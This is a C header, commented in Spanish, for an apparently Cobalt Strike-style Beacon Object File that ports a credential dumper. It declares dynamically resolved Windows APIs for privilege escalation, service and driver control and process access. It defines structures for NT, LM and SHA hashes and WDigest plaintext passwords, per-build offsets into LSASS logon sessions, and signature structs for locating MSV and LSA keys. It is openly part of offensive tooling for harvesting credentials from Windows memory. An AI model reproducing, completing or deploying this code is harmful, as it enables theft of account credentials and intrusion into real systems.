#pragma once
#ifndef COMMON_BOF_H
#define COMMON_BOF_H

// ============================================================
// Windows headers - orden importa
// ============================================================
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include "../include/beacon.h"

// ============================================================
// DFR - Dynamic Function Resolution
// Todas las WinAPI que usaremos en el proyecto
// ============================================================

// Kernel32
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileW(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadFile(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DeviceIoControl(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetSystemWindowsDirectoryW(LPWSTR,UINT);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR,UINT);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetModuleFileNameW(HMODULE,LPWSTR,DWORD);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetCurrentProcessId(VOID);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$HeapAlloc(HANDLE,DWORD,SIZE_T);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE,DWORD,LPVOID);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$OpenProcess(DWORD,BOOL,DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$QueryDosDeviceW(LPCWSTR,LPWSTR,DWORD);
DECLSPEC_IMPORT VOID     WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT LARGE_INTEGER WINAPI KERNEL32$GetFileSizeEx(HANDLE, PLARGE_INTEGER);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$SetFilePointer(HANDLE,LONG,PLONG,DWORD);

// Advapi32 - SCM y registro
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR,LPCWSTR,DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceW(SC_HANDLE,LPCWSTR,DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceW(SC_HANDLE,LPCWSTR,LPCWSTR,DWORD,DWORD,DWORD,DWORD,LPCWSTR,LPCWSTR,LPDWORD,LPCWSTR,LPCWSTR,LPCWSTR);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$ChangeServiceConfigW(SC_HANDLE,DWORD,DWORD,DWORD,LPCWSTR,LPCWSTR,LPDWORD,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$StartServiceW(SC_HANDLE,DWORD,LPCWSTR*);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$ControlService(SC_HANDLE,DWORD,LPSERVICE_STATUS);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$QueryServiceConfigW(SC_HANDLE,LPQUERY_SERVICE_CONFIGW,DWORD,LPDWORD);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT LONG      WINAPI ADVAPI32$RegOpenKeyExW(HKEY,LPCWSTR,DWORD,REGSAM,PHKEY);
DECLSPEC_IMPORT LONG      WINAPI ADVAPI32$RegQueryValueExW(HKEY,LPCWSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
DECLSPEC_IMPORT LONG      WINAPI ADVAPI32$RegSetValueExW(HKEY,LPCWSTR,DWORD,DWORD,const BYTE*,DWORD);
DECLSPEC_IMPORT LONG      WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR,LPCSTR,PLUID);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
DECLSPEC_IMPORT BOOL      WINAPI ADVAPI32$OpenProcessToken(HANDLE,DWORD,PHANDLE);

// Ntdll
DECLSPEC_IMPORT LONG NTAPI NTDLL$NtQuerySystemInformation(ULONG,PVOID,ULONG,PULONG);
DECLSPEC_IMPORT LONG NTAPI NTDLL$RtlAdjustPrivilege(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);

// ============================================================
// CRT intrinsics - en BOF no hay CRT, usamos ntdll directamente
// ============================================================
DECLSPEC_IMPORT int   __cdecl MSVCRT$strcmp(const char*, const char*);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);

#define strcmp   MSVCRT$strcmp
#define wcslen   MSVCRT$wcslen
#define strlen   MSVCRT$strlen

// lstrlenW lo implementamos manualmente para evitar conflictos
static inline int bof_lstrlenW(const wchar_t* s) {
    int i = 0; while(s[i]) i++; return i;
}
#define lstrlenW bof_lstrlenW

// ============================================================
// Macros de memoria - reemplazan new/delete y STL allocators
// ============================================================
#define BOF_ALLOC(sz)      KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (sz))
#define BOF_FREE(p)        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))
#define BOF_REALLOC(p, sz) KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (p), (sz))

// ============================================================
// ByteBuf - reemplaza std::vector<uint8_t>
// El "Bytes" del código original
// ============================================================
typedef struct {
    uint8_t* data;
    size_t   len;
} ByteBuf;

static inline ByteBuf bb_alloc(size_t sz) {
    ByteBuf b = { (uint8_t*)BOF_ALLOC(sz), sz };
    return b;
}
static inline void bb_free(ByteBuf* b) {
    if (b && b->data) { BOF_FREE(b->data); b->data = NULL; b->len = 0; }
}
static inline BOOL bb_valid(const ByteBuf* b) {
    return b && b->data && b->len > 0;
}

// ============================================================
// OptU64 - reemplaza std::optional<uint64_t>
// Usado en el page table walk (vtp)
// ============================================================
typedef struct {
    uint64_t val;
    BOOL     valid;
} OptU64;

static inline OptU64 opt_some(uint64_t v) { OptU64 o = { v, TRUE  }; return o; }
static inline OptU64 opt_none(void)        { OptU64 o = { 0, FALSE }; return o; }

// ============================================================
// SeenSet - reemplaza std::set<uint64_t>
// Anti-loop protection en los walks de listas enlazadas
// ============================================================
#define SEEN_MAX 256

typedef struct {
    uint64_t entries[SEEN_MAX];
    size_t   count;
} SeenSet;

static inline void     seen_init(SeenSet* s)                  { s->count = 0; }
static inline BOOL     seen_contains(SeenSet* s, uint64_t v)  {
    for (size_t i = 0; i < s->count; i++)
        if (s->entries[i] == v) return TRUE;
    return FALSE;
}
static inline void     seen_insert(SeenSet* s, uint64_t v)    {
    if (s->count < SEEN_MAX) s->entries[s->count++] = v;
}

// ============================================================
// Read helpers - idénticos al original, son inline puras
// Lectura segura de valores desde un buffer de bytes
// ============================================================
static inline uint16_t rw(const uint8_t* d, size_t o) { uint16_t v; memcpy(&v, d+o, 2); return v; }
static inline uint32_t rd(const uint8_t* d, size_t o) { uint32_t v; memcpy(&v, d+o, 4); return v; }
static inline int32_t  ri(const uint8_t* d, size_t o) { int32_t  v; memcpy(&v, d+o, 4); return v; }
static inline uint64_t rp(const uint8_t* d, size_t o) { uint64_t v; memcpy(&v, d+o, 8); return v; }

// ============================================================
// Estructuras de credenciales - equivalentes a los structs del original
// ============================================================
#define MAX_NAME_LEN 256

typedef struct {
    wchar_t  user[MAX_NAME_LEN];
    wchar_t  domain[MAX_NAME_LEN];
    char     nt_hash[33];    // 32 hex chars + null
    char     lm_hash[33];
    char     sha_hash[41];   // 40 hex chars + null
} Credential;

typedef struct {
    wchar_t  user[MAX_NAME_LEN];
    wchar_t  domain[MAX_NAME_LEN];
    wchar_t  password[MAX_NAME_LEN];
} WDigestCredential;

// Array de credenciales - en HEAP, no en stack
#define MAX_CREDS 64

typedef struct {
    Credential* items;  // heap allocated
    size_t      count;
    size_t      capacity;
} CredList;

typedef struct {
    WDigestCredential* items;  // heap allocated
    size_t             count;
    size_t             capacity;
} WDigestList;

static inline BOOL credlist_init(CredList* l) {
    l->items    = (Credential*)BOF_ALLOC(MAX_CREDS * sizeof(Credential));
    l->count    = 0;
    l->capacity = l->items ? MAX_CREDS : 0;
    return l->items != NULL;
}
static inline void credlist_free(CredList* l) {
    if (l->items) { BOF_FREE(l->items); l->items = NULL; }
    l->count = l->capacity = 0;
}
static inline BOOL wdlist_init(WDigestList* l) {
    l->items    = (WDigestCredential*)BOF_ALLOC(MAX_CREDS * sizeof(WDigestCredential));
    l->count    = 0;
    l->capacity = l->items ? MAX_CREDS : 0;
    return l->items != NULL;
}
static inline void wdlist_free(WDigestList* l) {
    if (l->items) { BOF_FREE(l->items); l->items = NULL; }
    l->count = l->capacity = 0;
}

// ============================================================
// Session offsets por build de Windows
// Idéntico al original - solo cambia el tipo de retorno
// ============================================================
typedef struct {
    uint32_t luid;
    uint32_t user;
    uint32_t domain;
    uint32_t logon_type;
    uint32_t cred_ptr;
} SessionOffsets;

static inline SessionOffsets session_offsets(uint32_t build) {
    if (build >= 22000) { SessionOffsets o = { 0x70, 0xA0, 0xB0, 0xE8, 0x118 }; return o; }
    if (build >= 9600)  { SessionOffsets o = { 0x70, 0x90, 0xA0, 0xD0, 0x108 }; return o; }
    if (build >= 7601)  { SessionOffsets o = { 0x58, 0x78, 0x88, 0xBC, 0xF0  }; return o; }
    {                    SessionOffsets o = { 0x48, 0x68, 0x78, 0xAC, 0xE0  }; return o; }
}

// ============================================================
// TextSection - resultado de parsear seccion .text de un PE
// ============================================================
typedef struct {
    uint32_t virtual_address;
    uint32_t raw_offset;
    uint32_t raw_size;
} TextSection;

// ============================================================
// Signature structs - idénticos al original
// ============================================================
typedef struct {
    const uint8_t* pattern;
    size_t         pattern_len;
    int32_t        fe_off;
    int32_t        cnt_off;
    int32_t        corr_off;
    uint32_t       min_build;
} MsvSig;

typedef struct {
    const uint8_t* pattern;
    size_t         pattern_len;
    int32_t        iv_off;
    int32_t        des_off;
    int32_t        aes_off;
    uint32_t       hk_off;
} LsaSig;

// ============================================================
// Utilidades de output - reemplazan std::format
// ============================================================
// Para strings normales usa BeaconPrintf directamente
// Para wchar_t necesitamos una conversión simple
static inline void print_wstr(const wchar_t* prefix, const wchar_t* ws) {
    char buf[MAX_NAME_LEN * 2] = {0};
    // Conversión simple wchar->char para output
    for (int i = 0; ws[i] && i < MAX_NAME_LEN*2-1; i++)
        buf[i] = (ws[i] < 128) ? (char)ws[i] : '?';
    BeaconPrintf(CALLBACK_OUTPUT, "%s%s", prefix, buf);
}

// ============================================================
// Helper: verificar si un archivo existe
// Reemplaza std::filesystem::exists
// ============================================================
static inline BOOL file_exists(const wchar_t* path) {
    return KERNEL32$GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES;
}

// ============================================================
// Helper: to_hex - convierte bytes a string hexadecimal
// Reemplaza el to_hex del original
// ============================================================
static inline void to_hex(const uint8_t* data, size_t len, char* out) {
    static const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) {
        out[i*2]   = hex[(data[i] >> 4) & 0xF];
        out[i*2+1] = hex[data[i] & 0xF];
    }
    out[len*2] = '\0';
}

#endif // COMMON_BOF_H
